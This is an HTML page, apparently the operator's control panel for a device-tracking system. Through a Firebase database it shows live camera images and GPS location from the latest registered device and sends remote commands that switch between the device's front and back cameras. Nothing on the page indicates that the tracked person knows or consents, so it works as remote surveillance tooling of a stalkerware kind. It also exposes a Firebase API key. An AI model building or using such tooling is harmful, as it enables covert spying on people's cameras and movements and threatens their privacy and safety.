<!DOCTYPE html>
<html>
<head>

<title>Viewer Control</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>

body{
background:black;
color:white;
font-family:Arial;
text-align:center;
}

button{
font-size:25px;
padding:10px 30px;
margin:10px;
}

img{
width:60%;
border:2px solid white;
}

iframe{
width:60%;
height:300px;
border:none;
margin-top:10px;
}

</style>

</head>
<body>

<h2>AI Viewer</h2>

<button onclick="switchCam('user')">FRONT CAMERA</button>

<button onclick="switchCam('environment')">BACK CAMERA</button>

<br>

<img id="cam">

<br>

<iframe id="map"></iframe>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceId=null;


// GET DEVICE
firebase.database().ref("devices").limitToLast(1)
.on("value",snap=>{

snap.forEach(child=>{

deviceId=child.key;


// CAMERA VIEW
firebase.database().ref("devices/"+deviceId+"/camera")
.on("value",s=>{

let d=s.val();

if(d){
cam.src=d.img+"&t="+Date.now();
}

});


// MAP
firebase.database().ref("devices/"+deviceId+"/location")
.on("value",s=>{

let d=s.val();

if(d){

map.src="https://maps.google.com/maps?q="
+d.lat+","+d.lon+"&output=embed";

}

});

});

});



function switchCam(mode){

firebase.database().ref("devices/"+deviceId+"/command").set(mode);

}

</script>

</body>
</html>
